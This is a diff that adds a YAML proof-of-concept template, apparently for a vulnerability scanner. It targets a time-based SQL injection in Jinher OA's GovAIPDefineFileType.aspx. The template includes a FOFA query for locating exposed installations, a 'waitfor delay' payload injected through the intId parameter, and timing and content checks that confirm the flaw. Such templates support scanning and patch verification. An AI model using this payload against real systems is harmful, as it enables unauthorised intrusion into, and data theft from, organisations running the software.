@@ -1,0 +1,28 @@
+id: poc-yaml-jinher-jhsoft-govaipdefinefiletype-aspx-sqli
+info:
+  name: 金和OA GovAIPDefineFileType.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /c6/Jhsoft.Web.govsetaip/GovAIPDefineFileType.aspx/?intId=1'waitfor+delay%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"选择类型") &&
+
+    contains(gbk_decode(body),"稿纸类型定义") &&
+
+    contains(body,"JHSoft") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
